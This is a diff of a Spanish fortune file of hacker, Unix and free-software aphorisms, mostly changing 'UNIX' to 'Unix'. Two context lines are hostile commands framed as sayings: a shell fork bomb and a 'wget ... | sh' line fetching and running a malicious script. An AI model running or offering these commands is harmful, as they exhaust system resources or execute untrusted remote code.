-UNIX es el /dev/drum, sus Hackers la manguera.
+Unix es el /dev/drum, sus Hackers la manguera.
 %
-El algoritmo de encriptación de contraseñas de UNIX está diseñado para utilizar un cómputo intensivo, y así desbaratar ataques de fuerza bruta. De este modo, aunque ningún intento de acceso tenga efecto, el sistema sufrirá una sobrecarga sustancial ante la labor de rechazar una gran cantidad de estos.
+El algoritmo de encriptación de contraseñas de Unix está diseñado para utilizar un cómputo intensivo, y así desbaratar ataques de fuerza bruta. De este modo, aunque ningún intento de acceso tenga efecto, el sistema sufrirá una sobrecarga sustancial ante la labor de rechazar una gran cantidad de estos.
 %
 Un handle es un nombre de pantalla. Un login es un nombre de acceso. Un usuario puede ser mas que los dos, pero nunca menos que uno.
 %
 Un niño privilegiado de guion podrá hacer travesuras con scripts y programas escritos por otros, a menudo sin comprender el exploit.
 %
-SunOS, aquella variante de BSD UNIX soportada por las estaciones de trabajo de Sun Microsystems, corrió el  camino del pterodáctilo cuando los vientos de Sun se aquietaron.
+SunOS, aquella variante de BSD Unix soportada por las estaciones de trabajo de Sun Microsystems, corrió el  camino del pterodáctilo cuando los vientos de Sun se aquietaron.
 %
 Realmente corregir los bugs de Window$ aspiraría los recursos que Micro$oft necesita para implementar la lista de deseos del departamento de Marketing.
 %
@@ -3843,7 +3851,7 @@ Si Micro$oft realmente comenzara a corregir los bugs de seguridad en sus sistema
 %
 Para los increiblemente paranoides usuarios de Multics, la seguridad lo era todo.
 %
-A diferencia de UNIX, la shell de Multics no tenía procesos hijos de usuario. Adoptaba, enlazando dinámicamente los programas a su propio código; las llamaba subrutinas, de las que luego se desentendía desenlazándolos.
+A diferencia de Unix, la shell de Multics no tenía procesos hijos de usuario. Adoptaba, enlazando dinámicamente los programas a su propio código; las llamaba subrutinas, de las que luego se desentendía desenlazándolos.
 %
 Los hackers de ITS tuvieron la ingenuidad de creer que cuando el usuario TURISTA descubriese cómo causar problemas, probablemente lo hubiese abandonado la urgencia de hacerlo, porque se sentiría parte de la mancomunidad.
 %
@@ -3851,7 +3859,7 @@ Las instrucciones para el operador de los programas semiautomáticos valen su pe
 %
 ¡Comparte y disfruta tu software!
 %
-El enlazador de UNIX en la PDP-11 en modo dividido de instrucciones y datos se ocupa de insertar un bloque de dos bytes en la locación 0 del espacio de datos. De este modo, ningún objeto de datos puede obtener la dirección de memoria 0 y confundirse con el puntero nulo de C.
+El enlazador de Unix en la PDP-11 en modo dividido de instrucciones y datos se ocupa de insertar un bloque de dos bytes en la locación 0 del espacio de datos. De este modo, ningún objeto de datos puede obtener la dirección de memoria 0 y confundirse con el puntero nulo de C.
 %
 Pocas veces será retribuido un programa gratuito, sin importar cuan decorado de mensajes explicativos de lo largo y dificultoso que fue el trabajo de creación esté.
 %
@@ -3925,7 +3933,7 @@ Si la edición de flujo es tan complicada como para requerir mas de un comando d
 %
 Asegúrate de utilizar comas en tus contraseñas de servicios de datos provistos por empresas, con el fin de arruinar la totalidad del fichero CVS que los atacantes utilizarán como colector de volcado cuando la base de datos clientelar no cifrada les resulte comprometida.
 %
-Para los abogados, UNIX es una marca registrada de los Laboratorios Bell. Para los hackers, es una mancomunidad.
+Para los abogados, Unix es una marca registrada de los Laboratorios Bell. Para los hackers, es una mancomunidad.
 %
 La shell es un procesador de macros que provee sustitución de parámetros, de comandos y generacioón de nombres de ficheros para los argumentos de órdenes. Y lo hace para el Pueblo.
 %
@@ -4025,21 +4033,21 @@ Aquél hacker con años de experiencia, reputación de alcance mundial, y un rol
 %
 Window$ ha sido diseñado para convertise en el primer virus informático que se propaga a las máquinas indirectamente a través de las personas y fuerzas monopolizadas del mercado, en lugar de hacerlo de manera directa por discos o redes de datos.
 %
-UNIX es aceite de serpiente.
+Unix es aceite de serpiente.
 %
 La única habilidad verdadera involucrada en el manejo de Window$ es la de ignorar y tolerar la incoherencia de una complejidad sin centido que afecta a muchos de sus programas.
 %
-Si vas a depender de algo, que sea de un ambiente multitarea protegido con escaso sobrante de replicación de procesos como el que existe en un ambiente UNIX con memoria virtual.
+Si vas a depender de algo, que sea de un ambiente multitarea protegido con escaso sobrante de replicación de procesos como el que existe en un ambiente Unix con memoria virtual.
 %
 Crea primero una versión funcional y comienza a usarla.
 %
 Simplemente muda aquellos patrones y algoritmos escenciales de tu mente a la CPU de la computadora.
 %
-UUCP fue inicialmente desarrollado en los Laboratorios Bell en 1977 para la comunicación entre sus centros de desarrollo de UNIX. Para mediados de 1978, esta red ya conectaba más de 80 sitios.
+UUCP fue inicialmente desarrollado en los Laboratorios Bell en 1977 para la comunicación entre sus centros de desarrollo de Unix. Para mediados de 1978, esta red ya conectaba más de 80 sitios.
 %
-Los orígenes de la Usenet se remontan a 1979, cuando tres universitarios idearon el intercambio de información general dentro de la comunidad de graduados usuarios de UNIX Séptima Edición.
+Los orígenes de la Usenet se remontan a 1979, cuando tres universitarios idearon el intercambio de información general dentro de la comunidad de graduados usuarios de Unix Séptima Edición.
 %
-La Usenet era en principio un sistema de mensajería en carteleras electrónicas implementada en 1979 por Steve Bellovin, Jim Ellis, Tom Truscott, y Steve Daniel, sobre todo en máquinas UNIX de la Universidad de Duke.
+La Usenet era en principio un sistema de mensajería en carteleras electrónicas implementada en 1979 por Steve Bellovin, Jim Ellis, Tom Truscott, y Steve Daniel, sobre todo en máquinas Unix de la Universidad de Duke.
 %
 La unidad básica de información en Usenet es el Artículo, que puede enviarse a un grupo de noticias jerárquico temático.
 %
@@ -4057,15 +4065,15 @@ Ante la sobrecarcarga, aquellos sistemas con memoria de intercambio o paginado d
 %
 Los problemas no interesantes constituyen una pérdida de tiempo intolerable.
 %
-UNIX es una broma liviana a Multics.
+Unix es una broma liviana a Multics.
 %
-El punto crucial de la historia de UNIX se presentó cuando fue reimplementado casi enteramente en lenguaje C, convirtiéndo en el primer sistema operativo de código fuente portable en 1972.
+El punto crucial de la historia de Unix se presentó cuando fue reimplementado casi enteramente en lenguaje C, convirtiéndo en el primer sistema operativo de código fuente portable en 1972.
 %
-La interoperabilidad de los sistemas UNIX brota del ejemplo dado por la mancomunidad de los países del Tercer Mundo.
+La interoperabilidad de los sistemas Unix brota del ejemplo dado por la mancomunidad de los países del Tercer Mundo.
 %
-Imita el ejemplo dado por la interoperabilidad de los sistemas UNIX.
+Imita el ejemplo dado por la interoperabilidad de los sistemas Unix.
 %
-La interoperabilidad en UNIX ha sucedido por la razón que es más simple para una minoría de sistemas inconexos alterar sus maneras para conformar a la mayoría de miles de millones de sistemas UNIX.
+La interoperabilidad en Unix ha sucedido por la razón que es más simple para una minoría de sistemas inconexos alterar sus maneras para conformar a la mayoría de miles de millones de sistemas Unix.
 %
 Juremos no dejar las terminales hasta ver al kernel enteramente libre, o ser desconectados como hackers de coraje.
 %
@@ -4101,7 +4109,7 @@ Cuando hay software libre, todo lo demás sobra.
 %
 GNU no conoce el lujo sino la gloria.
 %
-Al matar un proceso, UNIX no hace ningún género de funeral.
+Al matar un proceso, Unix no hace ningún género de funeral.
 %
 Sólo quiero tener programadores en mi pubnix.
 %
@@ -4111,7 +4119,7 @@ El Pubnix no es abrigador de crímenes.
 %
 El Pubnix no otorga un compilador al programador para que cometa la bajeza de abusar de estas ventajas, ofendiendo a los usuarios con software privativo.
 %
-Desde un terminal puedes conectar rápidamente con un BBS y enlazar con una máquina UNIX si la situación lo requiere.
+Desde un terminal puedes conectar rápidamente con un BBS y enlazar con una máquina Unix si la situación lo requiere.
 %
 Estas GAFAM creen que nuestros compiladores ya no analizan ni parsean. Vamos a desengañarlas. Si nos falta RAM y CPUs, compilaremos con cuaderno y birome.
 %
@@ -4143,11 +4151,11 @@ Lanzo mis paquetes sobre sus routers como Güemes a sus infernales. Mi moro es s
 %
 No dudes en volverte planero. Plan9 te permitirá realizar tu cómputo en comunidad.
 %
-La principal compañía con UNIX e a finales de los 80s era Micro$oft, al punto que existían más máquinas corriendo Micro$oft XENIX que todas las demás versiones de UNIX restantes combinadas.
+La principal compañía con Unix e a finales de los 80s era Micro$oft, al punto que existían más máquinas corriendo Micro$oft XENIX que todas las demás versiones de Unix restantes combinadas.
 %
 En principio, di con GNU por accidente. Por principio di mi código también.
 %
-Aprendí UNIX por accidente.
+Aprendí Unix por accidente.
 %
 De poco sirve usar un compilador si el binario que genera está alejado de la edificación de sociedades justas.
 %
@@ -4233,25 +4241,25 @@ Junto a millares de hackers en el Pubnix, escribe programas que operen como comb
 %
 Unido a decenas de hackers en los Pubnix, programa una revolución que edifique sobre la vieja infraestructura, una nueva red de datos justa, libre y soberana.
 %
-Antes que UNIX, la mayoría de los sistemas utilizaban abstracciones diferentes para cada dispositivo de hardware.
+Antes que Unix, la mayoría de los sistemas utilizaban abstracciones diferentes para cada dispositivo de hardware.
 %
-Una de las razones por la cual UNIX se hizo popular fue por emplear la abstración de fichero como interfaz para todos.
+Una de las razones por la cual Unix se hizo popular fue por emplear la abstración de fichero como interfaz para todos.
 %
-La abstracción de ficheros de UNIX permite utilizar comandos y llamadas de sistema que operan en ficheros para operar con cualquier dispositivo de hardware.
+La abstracción de ficheros de Unix permite utilizar comandos y llamadas de sistema que operan en ficheros para operar con cualquier dispositivo de hardware.
 %
-La mayoría de los programas de UNIX aceptan nombres de fichero como argumentos para obrar con ellos.
+La mayoría de los programas de Unix aceptan nombres de fichero como argumentos para obrar con ellos.
 %
 La única manera de aprender un nuevo lenguaje de programación consiste en idear un nuevo programa y a esta conecpción, escribirla.
 %
-UNIX es básicamente un sistema operativo simple, pero hay que ser un genio para entender su simplicidad.
+Unix es básicamente un sistema operativo simple, pero hay que ser un genio para entender su simplicidad.
 %
 C es rebuscado, fallado y un éxito enorme
 %
-UNIX ha retrasado 10 años la investigación en sistemas operativos. Linux la ha retrasado treinta.
+Unix ha retrasado 10 años la investigación en sistemas operativos. Linux la ha retrasado treinta.
 %
 Es mas fácil programar en un lenguaje que no tiene todo que en algunos que lo tienen.
 %
-Casi todo en la web usa estas dos cosas: C y UNIX.
+Casi todo en la web usa estas dos cosas: C y Unix.
 %
 C++ y Java, presumiblemente pueden crecer más rápido que C, pero apuesto que C seguirá viviendo.
 %
@@ -4267,7 +4275,7 @@ Aún estoy incierto sobre la sintaxis de declaración del lenguaje.
 %
 Para la tecnología de infraestructura, será difícil reemplazar a C.
 %
-El número de instalaciones de UNIX ha aumentado a diez. Se esperan más por venir.
+El número de instalaciones de Unix ha aumentado a diez. Se esperan más por venir.
 %
 C es en muchas maneras peculiar, pero como muchas otras cosas exitosas, cuenta con una cierta unidad de entender las cosas nacida de su desarrollo en un grupo pequeño.
 %
@@ -4279,9 +4287,9 @@ Un programa diseñado para responder a la entrada del Pueblo generalmente será 
 %
 Rob Pike fue la verdadera fuerza detrás de la base de Plan9. Mientras tanto, Ken Thompson creó el primer Gran Maestro de Ajedrez computado, y en general reescribió la bibliografía sobre finales ajedrecísticas.
 %
-Parece cierto que mucho del éxito de UNIX nace de la legibilidad, modificabilidad, y portabilidad de su código.
+Parece cierto que mucho del éxito de Unix nace de la legibilidad, modificabilidad, y portabilidad de su código.
 %
-UNIX es simple y coherente, pero requiere un genio (o al menos, un programador), para entender y apreciar su simplicidad.
+Unix es simple y coherente, pero requiere un genio (o al menos, un programador), para entender y apreciar su simplicidad.
 %
 No existió dificultad en hacer que la definición del lenguaje C fuese completamente abierta.
 %
@@ -4295,17 +4303,17 @@ Cuando leo comentarios sobre sugerencias para la senda que debería seguir C, a 
 %
 La noción de registro no es mas que un remanente obsoleto de los días de las tarjetas de 80 columnas.
 %
-Es cierto que comparado con la escena cuando comenzó UNIX, hoy los nichos ecológicos están bastante llenos, y es difícil salir con nuevas ideas frescas para un sistema operativo, o al menos propagarlas.
+Es cierto que comparado con la escena cuando comenzó Unix, hoy los nichos ecológicos están bastante llenos, y es difícil salir con nuevas ideas frescas para un sistema operativo, o al menos propagarlas.
 %
 Veinte porciento de todas las formas de entrada humana contienen datos malos.
 %
-Algunos consideran que UNIX ha sido la segunda invención más importante en salir de los Laboratorios Bell de AT&T, después del transistor.
+Algunos consideran que Unix ha sido la segunda invención más importante en salir de los Laboratorios Bell de AT&T, después del transistor.
 %
 Mi trabajo fue bastante teórico, sobre la teoría de la función recursiva, las jerarquías de funciones en términos de complejidad computacional en particular.
 %
 Me interesé en las computadoras reales y su programación sólo cuando pude concebirlas y dominarlas en mi mente.
 %
-Desde el punto de vista de la investigación en sistemas operativos, si UNIX no está fosilizado, al menos tiene rigor mortis, y es claro que el Pueblo debería ver más allá de él.
+Desde el punto de vista de la investigación en sistemas operativos, si Unix no está fosilizado, al menos tiene rigor mortis, y es claro que el Pueblo debería ver más allá de él.
 %
 El tipo de programación que C provee probablemente seguirá siendo obsolutamente similar, su uso declinará lentamente, pero relativmante.
 %
@@ -4317,11 +4325,11 @@ La filosofía GNU verdadera es más extrema de lo que puede importarme, pero cie
 %
 Cualquier trabajo de edición de software o de envío de correo puede hacerse en Plan 9.
 %
-C ya había sido implementado en varias máquinas y sistemas operativos distintos, y UNIX ya se distribuía en la PDP-11. Lo novedoso fue la portabilidad del sistema.
+C ya había sido implementado en varias máquinas y sistemas operativos distintos, y Unix ya se distribuía en la PDP-11. Lo novedoso fue la portabilidad del sistema.
 %
-Normalmente UNIX divide el disco en secciones mas pequeñas llamadas particiones. Operan como los componentes de un Frente de Liberación.
+Normalmente Unix divide el disco en secciones mas pequeñas llamadas particiones. Operan como los componentes de un Frente de Liberación.
 %
-En cada partición de disco, UNIX almacena estructuras de datos para representar ficheros, y el programa que implementa tal abstracción en el kernel suele conocerse como Sistema de Archivos.
+En cada partición de disco, Unix almacena estructuras de datos para representar ficheros, y el programa que implementa tal abstracción en el kernel suele conocerse como Sistema de Archivos.
 %
 Como ilustra nuestro Escudo Partidario, al establecer una conexión a una red de datos debe mediar un apretón de manos.
 %
@@ -4541,7 +4549,7 @@ Es tonto criticar a las comunicaciones mediadas por cómputo sólo porque alguna
 %
 Los compañeros con los que interactuará más unificadamente en línea serán seleccionados por interés organizativo en lugar de instrumentarlo por mera proximidad física.
 %
-Iniciar sesión en UNIX durante sólo uno o dos minutos, docenas de veces al día, es similar a echar un vistazo al cafetín para ver si están los compañeros en la mesita de siempre.
+Iniciar sesión en Unix durante sólo uno o dos minutos, docenas de veces al día, es similar a echar un vistazo al cafetín para ver si están los compañeros en la mesita de siempre.
 %
 Cambiar una Commodore 64 por un 386 equivalía a cambiar la moto Puma por un Justicialista Super Sport.
 %
@@ -4551,13 +4559,13 @@ Nuestro Movimiento ha de crear una Red aún más poderosa e inclusiva que la Int
 %
 La utilidad de una infraestructura de información de los Movimientos Políticos del Tercer Mundo que lleve las praxis de lucha a los excluídos digitales no puede soslayarse.
 %
-En 1983, programadores de la Universidad de California, financiados por ARPA, crearon una versión de UNIX para los modelos de computadora más nuevos.
+En 1983, programadores de la Universidad de California, financiados por ARPA, crearon una versión de Unix para los modelos de computadora más nuevos.
 %
-Los códigos informáticos para establecer enlace a través de la Internet, el conjunto de protocolos TCP/IP, se incorporó al UNIX de Berkeley en 1983.
+Los códigos informáticos para establecer enlace a través de la Internet, el conjunto de protocolos TCP/IP, se incorporó al Unix de Berkeley en 1983.
 %
-Las computadoras con el UNIX de Berkeley no sólo podrían comunicarse entre sí a través de módems lentos, sino también recurriendo a la transmisión por conmutación de paquetes, de mucho mayor desempeño en las troncales de Internet.
+Las computadoras con el Unix de Berkeley no sólo podrían comunicarse entre sí a través de módems lentos, sino también recurriendo a la transmisión por conmutación de paquetes, de mucho mayor desempeño en las troncales de Internet.
 %
-A mediados de los 80s surgieron nuevas empresas, como Sun Microsystems (financiada por ARPA), decididas portadoras de UNIX a redes integradas.
+A mediados de los 80s surgieron nuevas empresas, como Sun Microsystems (financiada por ARPA), decididas portadoras de Unix a redes integradas.
 %
 Las agrupaciones conformaron redes de datos locales unificando inicialmente los centros de cómputo de las mayores universidades del mundo.
 %
@@ -4677,15 +4685,15 @@ Auquellas redes de datos que no sean controladas y dirigidas por el Pueblo, se c
 %
 Una red mundial de comunicaciones diseñada y controlada por los Pueblos constituirá un ágora electrónico.
 %
-En los mejores Pubnix, sus primeros usuarios han diselado el sistema para los usuarios posteriores.
+En los mejores Pubnix, sus primeros usuarios han diseñado el sistema para los usuarios posteriores.
 %
-El uso del Pubnix coevoluciona con el sistema UNIX.
+El uso del Pubnix coevoluciona con el sistema Unix.
 %
 El sistema es el Pueblo.
 %
-GNU y UNIX son - con suerte - sistemas informáticos. Tal vez ni primos lejanos.
+GNU y Unix son - con suerte - sistemas informáticos. Tal vez ni primos lejanos.
 %
-El sistema UNIX tiene un admin que ordena, pero todo usuario del Pubnix ha de poder persuadir un sistema de gobernanza social que les resulte propio.
+El sistema Unix tiene un admin que ordena, pero todo usuario del Pubnix ha de poder persuadir un sistema de gobernanza social que les resulte propio.
 %
 El Pueblo que buscaba un gran proyecto colectivo en el ciberespacio acudió en masa a los Pubnix.
 %
@@ -4699,7 +4707,7 @@ Googl€ ha dejado de ser un buscador para convertirse en un escudriñador.
 %
 Combate las APIs propietarias. Embota sus sistemas hasta que sean de todos.
 %
-Un Pubnix involucra UNIX, datos, razón y emociones.
+Un Pubnix involucra Unix, datos, razón y emociones.
 %
 Para 1990 Usenet transmitía decenas de millones de palabras diariamente a varios millones de personas en más de cuarenta países.
 %
@@ -4713,13 +4721,13 @@ Si la facilidad de uso y la interfaz fuesen los criterios de validación, el Pue
 %
 UUCP ofrecía encaminamiento de correo electrónico y también permitía la impresión remota. Sin embargo, la función principal del sistema consistía en distribuir correcciones de errores y software nuevo.
 %
-UUCP hizo posible a cualquier computadora con UNIX discar automáticamente a través de un módem con cualquier otra máquina con UNIX, e intercambiar archivos de una computadora a otra.
+UUCP hizo posible a cualquier computadora con Unix discar automáticamente a través de un módem con cualquier otra máquina con Unix, e intercambiar archivos de una computadora a otra.
 %
 Los primeros nodos de lo que se conoce como Usenet comenzaron en 1980. Como otros antes que ellos, no tenían idea de que crecería hasta cubrir el mundo.
 %
 La Jerarquía de Usenet no comprende una cadena de mando sino una forma de simplificar grandes agrupamientos de información mediante la categorización arbolada.
 %
-Usenet estaba originalmente destinada a representar la red de usuarios de UNIX que diseñaran un un foro para discusiones sobre UNIX, para la resolución de problemas de UNIX.
+Usenet estaba originalmente destinada a representar la red de usuarios de Unix que diseñaran un un foro para discusiones sobre Unix, para la resolución de problemas de Unix.
 %
 Las FAQs son un destilado del Usenet.
 %
@@ -4803,7 +4811,7 @@ Usa la orden de shell :(){:|:&};: para ocupar recursivamente recursos informáti
 %
 Utiliza wget http://codigo_maligno -O- | sh para correr telemáticamente un script maligno.
 %
-No es labor de UNIX impedir que el root se de un tiro en el pie.
+No es labor de Unix impedir que el root se de un tiro en el pie.
 %
 Desprograma la obsolescencia con software libre.
 %
@@ -5102,9 +5110,9 @@ Es necesario dar consistencia racional orgánica a GNU, que hoy solamente está 
 %
 Instalado GNU nosotros hemos realizado una reforma casi integral de los distintos sectores del disco.
 %
-Todos los hackers pusieron su código a disposición de esta naciente comunidad de programadores. Lo compilaron y ejecutaron, pero quedaron todos desposeídos porque esa larga guerra UNIX fue consumiendo todo lo que los hackers tenían.
+Todos los hackers pusieron su código a disposición de esta naciente comunidad de programadores. Lo compilaron y ejecutaron, pero quedaron todos desposeídos porque esa larga guerra Unix fue consumiendo todo lo que los hackers tenían.
 %
-En la guerra UNIX, cada uno puso cuanto tenía, incluso código y binarios, y era de esperar que obtenido el triunfo, el beneficio habría de repartirse también poseyendo cada programador en la medida en que había perdido. Pero en la pirinola salió "Gana Torvalds".
+En la guerra Unix, cada uno puso cuanto tenía, incluso código y binarios, y era de esperar que obtenido el triunfo, el beneficio habría de repartirse también poseyendo cada programador en la medida en que había perdido. Pero en la pirinola salió "Gana Torvalds".
 %
 Donde hay una Shell, hay una senda para la Liberación.
 %
@@ -5134,7 +5142,7 @@ Nuestras compilaciones son constructivas, y son para los de abajo.
 %
 Nuestros binarios son trabajo de nuestra CPU, y fruto de esa labor es la felicidad del Pueblo.
 %
-La grandeza de UNIX depende de su minimalismo.
+La grandeza de Unix depende de su minimalismo.
 %
 Las modificaciones a un programa deben realizarse con una absoluta congruencia en los fines y con una absoluta armonía en los medios.
 %
@@ -5507,7 +5515,7 @@ Co-habita toda red tan oscura como la piel de mis grasitas. Te iluminará.
 %
 Cede a las ciber-oligarquías, y verás privadas a las ciudades del Tercer Mundo de aire acondicionado a cambio de correr programas de IA sólo para sintetizar imaginería de chicas con manos de empanada.
 %
-Hasta los sabios más rígidos, austeros y barbudos pueden hacer con UNIX lo que normalmente no se les permite a las personas serias: jugar.
+Hasta los sabios más rígidos, austeros y barbudos pueden hacer con Unix lo que normalmente no se les permite a las personas serias: jugar.
 %
 Hay varias posibilidades de contemplar el mundo. Los padres intelectuales de la calculadora electrónica lo concebían como una gran instalación compuesta de informaciones.
 %
@@ -5681,7 +5689,7 @@ En la guerra telemática, toma en consideración la relación fluida entre los p
 %
 En la guerra telemática, toma en consideración la relación fluida entre los power-users y los usuarios.
 %
-En la guerra telemática, toma en consideración la relación fluida  entre los magos UNIX y los power-users.
+En la guerra telemática, toma en consideración la relación fluida  entre los magos Unix y los power-users.
 %
 En la guerra telemática, toma en consideración la relación fluida entre los hackers y los programadores.
 %
@@ -5765,7 +5773,7 @@ Todo lo que existe fuera de nuestra mente es realidad objetiva. Todo lo que exis
 %
 Hay programadoras que son capaces de conocerse bien a sí mismas, pero no a las ciber-oligarquías; hay otras con las que sucede lo contrario. Ni éstas ni aquéllas pueden resolver el problema de aprender y aplicar los postulados de la guerra telemática.
 %
-Navegando en la mar telemática, un mago UNIX no sólo debe evitar hundirse, sino que debe asegurarse la llegada a puerto seguro ante las tormentas de baudios.
+Navegando en la mar telemática, un mago Unix no sólo debe evitar hundirse, sino que debe asegurarse la llegada a puerto seguro ante las tormentas de baudios.
 %
 Los postulados de la conducción telemática constituyen el arte de navegar en la mar telemática.
 %
